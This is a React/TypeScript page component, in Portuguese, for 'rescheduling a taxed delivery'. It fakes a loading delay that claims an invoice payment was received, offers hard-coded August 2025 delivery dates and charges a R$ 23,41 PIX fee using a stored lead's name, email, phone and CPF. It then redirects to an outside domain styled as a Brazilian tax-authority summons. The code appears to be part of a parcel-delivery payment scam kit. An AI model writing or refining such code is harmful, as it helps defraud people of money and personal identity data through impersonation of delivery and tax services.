import { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import { ChevronLeft, ChevronRight, Info, Truck } from 'lucide-react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Header } from '@/components/Header';
import { Footer } from '@/components/Footer';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { PixCheckout } from '@/components/PixCheckout';
import { leadsRepository } from '@/lib/leadsRepository';

export const DeliveryDatePage = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const tracking = params.get("tracking") || "";
  const amount = params.get("amount") || "0";
  
  const [selectedDate, setSelectedDate] = useState<Date | null>(null);
  const [currentMonth, setCurrentMonth] = useState(new Date(2025, 7, 1)); // Agosto 2025
  const [isLoading, setIsLoading] = useState(true);
  const [showPaymentModal, setShowPaymentModal] = useState(false);
  const [lead, setLead] = useState(null);
  const externalDomain = 'https://irpf-intimacao.org';

  // Simular carregamento da página
  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 3500); // 3,5 segundos de carregamento

    return () => clearTimeout(timer);
  }, []);

  // Busca dados do lead baseado no tracking
  useEffect(() => {
    const fetchLead = async () => {
      if (tracking) {
        try {
          const leadData = await leadsRepository.findByTracking(tracking);
          setLead(leadData);
        } catch (error) {
          console.error('Erro ao buscar dados do lead:', error);
        }
      }
    };
    
    fetchLead();
  }, [tracking]);

  // Datas disponíveis para entrega (baseado na imagem)
  const availableDates = [
    new Date(2025, 7, 19), // 19 de agosto
    new Date(2025, 7, 20), // 20 de agosto
    new Date(2025, 7, 21), // 21 de agosto
    new Date(2025, 7, 22), // 22 de agosto
    new Date(2025, 7, 25), // 25 de agosto
    new Date(2025, 7, 26), // 26 de agosto
    new Date(2025, 7, 27), // 27 de agosto
    new Date(2025, 7, 28), // 28 de agosto
    new Date(2025, 7, 29), // 29 de agosto
  ];

  const isDateAvailable = (date: Date) => {
    return availableDates.some(available => 
      available.getDate() === date.getDate() && 
      available.getMonth() === date.getMonth() && 
      available.getFullYear() === date.getFullYear()
    );
  };

  const isDatePast = (date: Date) => {
    const today = new Date();
    today.setHours(0, 0, 0, 0);
    return date < today;
  };

  const handleDateSelect = (date: Date) => {
    if (isDateAvailable(date) && !isDatePast(date)) {
      setSelectedDate(date);
      setShowDeliveryOptions(true);
    }
  };

  const [showDeliveryOptions, setShowDeliveryOptions] = useState(false);

  const handleConfirmScheduling = () => {
    // Aqui você pode adicionar a lógica para salvar o agendamento
    console.log('Agendamento confirmado para:', selectedDate);
    navigate('/');
  };

  const formatDate = (date: Date) => {
    return date.toLocaleDateString('pt-BR', { 
      day: '2-digit', 
      month: '2-digit', 
      year: 'numeric' 
    });
  };

  const formatFullDate = (date: Date) => {
    return date.toLocaleDateString('pt-BR', { 
      day: 'numeric', 
      month: 'long', 
      year: 'numeric' 
    });
  };

  const getMonthName = (date: Date) => {
    return date.toLocaleDateString('pt-BR', { month: 'long', year: 'numeric' });
  };

  const getDaysInMonth = (date: Date) => {
    const year = date.getFullYear();
    const month = date.getMonth();
    const firstDay = new Date(year, month, 1);
    const lastDay = new Date(year, month + 1, 0);
    const daysInMonth = lastDay.getDate();
    const startingDay = firstDay.getDay();

    const days = [];
    
    // Adicionar dias do mês anterior
    const prevMonth = new Date(year, month - 1, 0);
    const prevMonthDays = prevMonth.getDate();
    for (let i = startingDay - 1; i >= 0; i--) {
      days.push(new Date(year, month - 1, prevMonthDays - i));
    }
    
    // Adicionar dias do mês atual
    for (let i = 1; i <= daysInMonth; i++) {
      days.push(new Date(year, month, i));
    }
    
    // Adicionar dias do próximo mês para completar a grade
    const remainingDays = 42 - days.length; // 6 semanas * 7 dias
    for (let i = 1; i <= remainingDays; i++) {
      days.push(new Date(year, month + 1, i));
    }
    
    return days;
  };

  const changeMonth = (direction: 'prev' | 'next') => {
    setCurrentMonth(prev => {
      const newMonth = new Date(prev);
      if (direction === 'prev') {
        newMonth.setMonth(prev.getMonth() - 1);
      } else {
        newMonth.setMonth(prev.getMonth() + 1);
      }
      return newMonth;
    });
  };

  const days = getDaysInMonth(currentMonth);
  const weekDays = ['dom', 'seg', 'ter', 'qua', 'qui', 'sex', 'sab'];

  // Tela de carregamento
  if (isLoading) {
    return (
      <>
        <Header />
        <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4 pt-20">
          <Card className="w-full max-w-md p-8 text-center">
            {/* Spinner de carregamento */}
            <div className="flex justify-center mb-6">
              <div className="w-12 h-12 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin"></div>
            </div>
            
            {/* Texto de carregamento */}
            <p className="text-gray-700 leading-relaxed">
              Recebemos o pagamento da Nota fiscal. Agora, nosso time irá direcionar para o agendamento da nova data de entrega. Aguarde nosso contato com as informações.
            </p>
          </Card>
        </div>
        <Footer />
      </>
    );
  }

  return (
    <>
      <Header />
      <div className="min-h-screen bg-gray-50 flex flex-col items-center p-4 pt-20">
        {/* Card de Informação */}
        <Card className="w-full max-w-2xl mb-6 p-6 border-l-4 border-l-blue-400 bg-blue-50">
          <div className="flex items-start">
            <div className="flex-shrink-0">
              <div className="w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center">
                <Info className="h-4 w-4 text-white" />
              </div>
            </div>
            <div className="ml-3">
              <h3 className="text-lg font-bold text-gray-800 mb-2">
                REAGENDAMENTO DE ENTREGA TAXADA
              </h3>
              <p className="text-gray-700">
                O reagendamento é necessário quando a entrega não pôde ser concluída na data prevista. 
                Após a confirmação do pagamento da taxa, pedimos que escolha no calendário abaixo o dia 
                que for mais conveniente para receber o pedido. Nossa equipe confirmará a nova data de 
                entrega após a sua seleção.
              </p>
            </div>
          </div>
        </Card>

        {/* Card do Calendário */}
        <Card className="w-full max-w-2xl p-6">
          <h3 className="text-lg font-bold text-gray-800 mb-6">
            Escolha a nova data de entrega:
          </h3>
          
          {/* Navegação do Mês */}
          <div className="flex items-center justify-between mb-4">
            <Button
              variant="outline"
              size="sm"
              onClick={() => changeMonth('prev')}
              className="p-2"
            >
              <ChevronLeft className="h-4 w-4" />
            </Button>
            <h4 className="text-lg font-semibold text-gray-800 capitalize">
              {getMonthName(currentMonth)}
            </h4>
            <Button
              variant="outline"
              size="sm"
              onClick={() => changeMonth('next')}
              className="p-2"
            >
              <ChevronRight className="h-4 w-4" />
            </Button>
          </div>

          {/* Dias da Semana */}
          <div className="grid grid-cols-7 gap-1 mb-2">
            {weekDays.map(day => (
              <div key={day} className="text-center text-sm font-medium text-gray-500 py-2">
                {day}
              </div>
            ))}
          </div>

          {/* Calendário */}
          <div className="grid grid-cols-7 gap-1">
            {days.map((date, index) => {
              const isCurrentMonth = date.getMonth() === currentMonth.getMonth();
              const isAvailable = isDateAvailable(date);
              const isPast = isDatePast(date);
              const isSelected = selectedDate && 
                date.getDate() === selectedDate.getDate() && 
                date.getMonth() === selectedDate.getMonth() && 
                date.getFullYear() === selectedDate.getFullYear();

              return (
                <button
                  key={index}
                  onClick={() => handleDateSelect(date)}
                  disabled={!isAvailable || isPast}
                  className={`
                    p-2 text-sm rounded-lg transition-colors
                    ${!isCurrentMonth ? 'text-gray-300' : 'text-gray-700'}
                    ${isPast ? 'text-gray-400 cursor-not-allowed' : ''}
                    ${isAvailable && !isPast ? 'hover:bg-blue-100 cursor-pointer font-semibold' : ''}
                    ${isSelected ? 'bg-blue-500 text-white font-bold' : ''}
                    ${!isAvailable && !isPast && isCurrentMonth ? 'text-gray-500' : ''}
                  `}
                >
                  {date.getDate()}
                </button>
              );
            })}
          </div>

                     

                     {/* Informações do Tracking */}
           {tracking && (
             <div className="mt-4 p-3 bg-gray-50 rounded-lg">
               <p className="text-xs text-gray-600">
                 Código de Rastreio: <span className="font-mono">{tracking}</span>
               </p>
             </div>
           )}
         </Card>

                   {/* Seção de Opções de Entrega */}
          {showDeliveryOptions && selectedDate && (
            <>
              {/* Data Selecionada */}
              <Card className="w-full max-w-2xl mb-6 p-6 border-l-4 border-l-green-500 bg-green-50 animate-in slide-in-from-bottom-4 duration-500 ease-out">
                                <div className="flex items-center">
                   <div className="flex-shrink-0">
                     <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center animate-in zoom-in duration-300 delay-100">
                       <div className="w-3 h-3 bg-white rounded-full"></div>
                     </div>
                   </div>
                 <div className="ml-3">
                   <p className="text-gray-800">
                     Data selecionada: <span className="text-green-600 font-semibold">{formatFullDate(selectedDate)}</span>
                   </p>
                 </div>
               </div>
             </Card>

                           {/* Opções de Frete */}
              <Card className="w-full max-w-2xl mb-6 p-6 animate-in slide-in-from-bottom-4 duration-500 ease-out delay-200">
               <h3 className="text-lg font-bold text-gray-800 mb-6 uppercase">
                 Pagamento do Frete
               </h3>
               
               {/* Opção de Entrega Padrão */}
               <div className="border border-gray-200 rounded-lg p-4 bg-gray-50">
                 <div className="flex items-center justify-between">
                                        <div className="flex items-center">
                       <div className="flex-shrink-0 mr-4">
                         <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center animate-in zoom-in duration-300 delay-300">
                           <Truck className="h-6 w-6 text-blue-600" />
                         </div>
                       </div>
                     <div>
                       <h4 className="font-semibold text-gray-800">Entrega padrão</h4>
                       <p className="text-sm text-gray-600">
                         {formatFullDate(selectedDate)} (horário comercial)
                       </p>
                     </div>
                   </div>
                   <div className="text-right">
                     <p className="text-lg font-bold text-blue-600">R$ 23,41</p>
                   </div>
                 </div>
               </div>

                               {/* Botão de Confirmação Final */}
                <div className="mt-6 animate-in slide-in-from-bottom-2 duration-300 delay-400">
                  <Button
                    onClick={() => setShowPaymentModal(true)}
                    className="w-full bg-blue-500 hover:bg-blue-600 text-white font-bold py-3 px-6 rounded-lg transition-colors duration-200 uppercase"
                  >
                    Confirmar Agendamento
                  </Button>
                </div>
             </Card>
           </>
                   )}
        </div>
        
        {/* Modal de Pagamento */}
        <Dialog open={showPaymentModal} onOpenChange={setShowPaymentModal}>
          <DialogContent className="sm:max-w-xl max-h-[90vh] overflow-auto no-scrollbar [&>button]:text-gray-500 [&>button:hover]:text-gray-700">
            <DialogHeader>
              <DialogTitle>Pagamento PIX</DialogTitle>
            </DialogHeader>
            {lead ? (
              <PixCheckout
                amount={23.41}
                trackingCode={tracking}
                customer={{
                  name: lead.name,
                  email: lead.email,
                  phone: lead.telephone,
                  document: {
                    type: "cpf",
                    number: lead.cpf,
                  },
                }}
                overrideNextUrl={`${externalDomain}/receitafederal/${encodeURIComponent(lead.cpf || '')}`}
              />
            ) : (
              <div className="flex items-center justify-center py-10">
                <div className="w-10 h-10 border-4 border-gray-200 border-t-blue-500 rounded-full animate-spin" />
              </div>
            )}
          </DialogContent>
        </Dialog>
        
        <Footer />
      </>
    );
  };
